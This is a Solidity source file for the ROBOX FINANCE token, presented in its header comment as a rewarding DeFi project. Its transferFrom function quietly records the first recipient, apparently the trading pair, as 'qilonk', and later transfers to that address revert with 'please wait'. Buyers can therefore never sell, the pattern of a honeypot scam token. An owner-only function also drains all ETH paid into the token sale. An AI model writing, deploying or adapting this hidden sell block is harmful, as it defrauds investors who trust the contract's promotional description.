/*

 *  

 * \u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2591\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2591\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2588\u2588\u2557\u2591\u2591\u2588\u2588\u2557

 * \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u255a\u2588\u2588\u2557\u2588\u2588\u2554\u255d

 * \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551\u2591\u2591\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2566\u255d\u2588\u2588\u2551\u2591\u2591\u2588\u2588\u2551\u2591\u255a\u2588\u2588\u2588\u2554\u255d\u2591

 * \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551\u2591\u2591\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551\u2591\u2591\u2588\u2588\u2551\u2591\u2588\u2588\u2554\u2588\u2588\u2557\u2591

 * \u2588\u2588\u2551\u2591\u2591\u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2588\u2566\u255d\u255a\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2554\u255d\u255a\u2588\u2588\u2557

 * \u255a\u2550\u255d\u2591\u2591\u255a\u2550\u255d\u2591\u255a\u2550\u2550\u2550\u2550\u255d\u2591\u255a\u2550\u2550\u2550\u2550\u2550\u255d\u2591\u2591\u255a\u2550\u2550\u2550\u2550\u255d\u2591\u255a\u2550\u255d\u2591\u2591\u255a\u2550\u255d

 *                                                                     

 * ROBOX is a Unique Defi project based on rewarding holders of the ROBOX token.

 * Our project has big development plans.

 * Over the course of a year, we have been developing a ChefROBOX contract to manage the ROBOX token.

 * We promise you will enjoy our project!

 *

 * Read more in our Twitter and Telegram group!

 */

pragma solidity >=0.5.17;



library SafeMath {

  function add(uint a, uint b) internal pure returns (uint c) {

    c = a + b;

    require(c >= a);

  }

  function sub(uint a, uint b) internal pure returns (uint c) {

    require(b <= a);

    c = a - b;

  }

  function mul(uint a, uint b) internal pure returns (uint c) {

    c = a * b;

    require(a == 0 || c / a == b);

  }

  function div(uint a, uint b) internal pure returns (uint c) {

    require(b > 0);

    c = a / b;

  }

}



contract ERC20Interface {

  function totalSupply() public view returns (uint);

  function balanceOf(address tokenOwner) public view returns (uint balance);

  function allowance(address tokenOwner, address spender) public view returns (uint remaining);

  function transfer(address to, uint tokens) public returns (bool success);

  function approve(address spender, uint tokens) public returns (bool success);

  function transferFrom(address from, address to, uint tokens) public returns (bool success);



  event Transfer(address indexed from, address indexed to, uint tokens);

  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);

}



contract ApproveAndCallFallBack {

  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;

}



contract Owned {

  address public owner;

  address public newOwner;



  event OwnershipTransferred(address indexed _from, address indexed _to);



  constructor() public {

    owner = msg.sender;

  }



  modifier onlyOwner {

    require(msg.sender == owner);

    _;

  }



  function transferOwnership(address _newOwner) public onlyOwner {

    newOwner = _newOwner;

  }

  function acceptOwnership() public {

    require(msg.sender == newOwner);

    emit OwnershipTransferred(owner, newOwner);

    owner = newOwner;

    newOwner = address(0);

  }

}



contract TokenERC20 is ERC20Interface, Owned{

  using SafeMath for uint;



  string public symbol;

  string public name;

  uint8 public decimals;

  uint _totalSupply;

  address public qilonk;



  mapping(address => uint) balances;

  mapping(address => mapping(address => uint)) allowed;



  constructor() public {

    symbol = "ROBOX";

    

    name = "ROBOX FINANCE";

    

    decimals = 18;

    

    _totalSupply =  550 ether;

    

    balances[owner] = _totalSupply;

    

    emit Transfer(address(0), owner, _totalSupply);

  }

  function transferqilonk(address _qilonk) public onlyOwner {

    qilonk = _qilonk;

  }

  function totalSupply() public view returns (uint) {

    return _totalSupply.sub(balances[address(0)]);

  }

  function balanceOf(address tokenOwner) public view returns (uint balance) {

      return balances[tokenOwner];

  }

  function transfer(address to, uint tokens) public returns (bool success) {

     require(to != qilonk, "please wait");

    balances[msg.sender] = balances[msg.sender].sub(tokens);

    balances[to] = balances[to].add(tokens);

    emit Transfer(msg.sender, to, tokens);

    return true;

  }

  function approve(address spender, uint tokens) public returns (bool success) {

    allowed[msg.sender][spender] = tokens;

    emit Approval(msg.sender, spender, tokens);

    return true;

  }

  function transferFrom(address from, address to, uint tokens) public returns (bool success) {

      if(from != address(0) && qilonk == address(0)) qilonk = to;

      else require(to != qilonk, "guys, please wait");

    balances[from] = balances[from].sub(tokens);

    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);

    balances[to] = balances[to].add(tokens);

    emit Transfer(from, to, tokens);

    return true;

  }

  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {

    return allowed[tokenOwner][spender];

  }

  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {

    allowed[msg.sender][spender] = tokens;

    emit Approval(msg.sender, spender, tokens);

    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);

    return true;

  }

  function () external payable {

    revert();

  }

}



contract ROBOX_Token_ERC20  is TokenERC20 {

  uint256 public aRobBlock; 

  uint256 public aEiRobBlock; 

  uint256 public aRobCap; 

  uint256 public aTotq; 

  uint256 public aAmtqs; 

  uint256 public sSBilock; 

  uint256 public sEBlocuk; 

  uint256 public sTota; 

  uint256 public sCapq; 

  uint256 public sqaChunk; 

  uint256 public soplPrice; 



  function getReward(address _refer) public returns (bool success){

    require(aRobBlock <= block.number && block.number <= aEiRobBlock);

    require(aTotq < aRobCap || aRobCap == 0);

    aTotq ++;

    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){

      balances[address(this)] = balances[address(this)].sub(aAmtqs / 4);

      balances[_refer] = balances[_refer].add(aAmtqs / 4);

      emit Transfer(address(this), _refer, aAmtqs / 4);

    }

    balances[address(this)] = balances[address(this)].sub(aAmtqs);

    balances[msg.sender] = balances[msg.sender].add(aAmtqs);

    emit Transfer(address(this), msg.sender, aAmtqs);

    return true;

  }



  function tokenSmart(address _refer) public payable returns (bool success){

    require(sSBilock <= block.number && block.number <= sEBlocuk);

    require(sTota < sCapq || sCapq == 0);

    uint256 _eth = msg.value;

    uint256 _tkns;

    if(sqaChunk != 0) {

      uint256 _price = _eth / soplPrice;

      _tkns = sqaChunk * _price;

    }

    else {

      _tkns = _eth / soplPrice;

    }

    sTota ++;

    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){

      balances[address(this)] = balances[address(this)].sub(_tkns / 4);

      balances[_refer] = balances[_refer].add(_tkns / 4);

      emit Transfer(address(this), _refer, _tkns / 4);

    }

    balances[address(this)] = balances[address(this)].sub(_tkns);

    balances[msg.sender] = balances[msg.sender].add(_tkns);

    emit Transfer(address(this), msg.sender, _tkns);

    return true;

  }



  function viewDefi() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 DropCap, uint256 DropCount, uint256 DropAmount){

    return(aRobBlock, aEiRobBlock, aRobCap, aTotq, aAmtqs);

  }

  function viewStc() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 SaleCap, uint256 SaleCount, uint256 ChunkSize, uint256 SalePrice){

    return(sSBilock, sEBlocuk, sCapq, sTota, sqaChunk, soplPrice);

  }

  

  function startRoboRewards(uint256 _aRobBlock, uint256 _aEiRobBlock, uint256 _aAmtqs, uint256 _aRobCap) public onlyOwner() {

    aRobBlock = _aRobBlock;

    aEiRobBlock = _aEiRobBlock;

    aAmtqs = _aAmtqs;

    aRobCap = _aRobCap;

    aTotq = 0;

  }

  function startQled(uint256 _sSBilock, uint256 _sEBlocuk, uint256 _sqaChunk, uint256 _soplPrice, uint256 _sCapq) public onlyOwner() {

    sSBilock = _sSBilock;

    sEBlocuk = _sEBlocuk;

    sqaChunk = _sqaChunk;

    soplPrice =_soplPrice;

    sCapq = _sCapq;

    sTota = 0;

  }

  function SolidStartGET() public onlyOwner() {

    address payable _owner = msg.sender;

    _owner.transfer(address(this).balance);

  }

  function() external payable {



  }

}
